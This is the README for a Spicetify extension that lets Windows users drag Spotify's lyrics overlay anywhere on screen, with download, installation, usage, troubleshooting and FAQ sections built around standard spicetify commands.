# 🎵 spotify-lyrics-position - Move your lyrics anywhere on screen

[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)

This software changes how you view lyrics in Spotify. The standard Spotify app locks lyrics to a full-screen view. This tool unlocks that view. You can drag and drop your lyrics to any part of your computer screen. You see your lyrics while you browse your library or search for new music.

## ⚙️ System Requirements

Your computer needs a few items to run this tool. Verify you have these ready before you start:

* A Windows 10 or Windows 11 computer.
* The desktop version of Spotify installed from the official website.
* Spicetify-CLI installed on your device.

If you do not have Spicetify-CLI, visit the official Spicetify website. Follow their instructions to install the command line interface. This tool relies on the Spicetify framework to talk to the Spotify application.

## 📥 Downloading the Tool

You must download the correct file from the official releases page. 

[Visit this page to download the latest version](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)

Look for the file ending in `.js`. This is the extension file. Save this file to a folder you can find later, such as your Downloads folder or Desktop. Do not change the name of the file.

## 🛠️ Installation Steps

Follow these steps to add the lyrics position tool to your Spotify app:

1. Open your File Explorer and find the folder where you saved the extension file.
2. Select the file and press Ctrl+C to copy it.
3. Open your Spicetify extensions folder. You can find this by typing `spicetify config` into your command prompt or PowerShell window. Look for the path listed next to "extensions_path".
4. Open that specific folder in File Explorer.
5. Press Ctrl+V to paste the extension file into this folder.
6. Now, open your command prompt or PowerShell window again.
7. Type `spicetify config extensions spotify-lyrics-position.js` and press Enter.
8. Type `spicetify apply` and press Enter.

The Spotify application will restart automatically. Once it loads, you will see your new lyrics layout options.

## 🖱️ Using the Interface

After the restart, Spotify starts with the extension enabled. Look for the lyrics button as you normally would. When the lyrics appear, click and hold your left mouse button on the lyrics window. Drag your mouse to move the text to any area of the screen.

Release the mouse button to lock the lyrics in the new spot. The software remembers this position even if you close and reopen Spotify. If you want to hide the lyrics, click the lyrics button again. The lyrics disappear until you need them next time.

## 🔧 Troubleshooting Common Errors

Sometimes the tool might not appear after you run the apply command. Follow these steps to fix the issue:

* Refresh your Spotify theme. Type `spicetify apply` again in your command prompt.
* Check your version of Spicetify. Type `spicetify -v` to ensure you run the latest release.
* Clear your browser cache. Sometimes old settings conflict with the new extension.
* Ensure you installed Spotify from the website, not the Microsoft Store. The Microsoft Store version prevents Spicetify from making changes.

If the lyrics window remains stuck in the center, try to disable and re-enable the extension. Type `spicetify config extensions spotify-lyrics-position.js-` followed by `spicetify apply`. Then repeat the installation steps.

## 📁 Managing Extension Settings

The extension uses simple code to determine your lyrics position. Advanced users can edit the `.js` file to change default colors or font sizes. Open the file in a standard text editor like Notepad. Look for values labeled "color", "font-size", or "opacity". Save your changes after you edit these values. Run `spicetify apply` again to see your updates in the Spotify app.

Always keep a backup copy of the original file if you plan to edit the code. This ensures you can restore the tool if you make a mistake during editing.

## 📋 Frequently Asked Questions

Does this tool work on Mac?
This specific version works only on Windows. Use the official Spicetify documentation to find versions compatible with other operating systems.

Can I move lyrics to a second monitor?
Yes. You can drag the lyrics window across your entire desktop area. This includes secondary monitors connected to your computer.

Does this break Spotify?
No. The tool changes the visual layout of the lyrics overlay. It does not modify your account data or your saved songs.

Is this safe?
The tool runs locally on your machine. No data leaves your computer. It only modifies your local Spotify installation to allow for custom window placement.

Keywords: extension, extensions, lyric, lyrics, spicetify, spicetify-cli, spicetify-extensions, spotify, spotify-extension, spotify-extensions, spotify-lyric, spotify-lyrics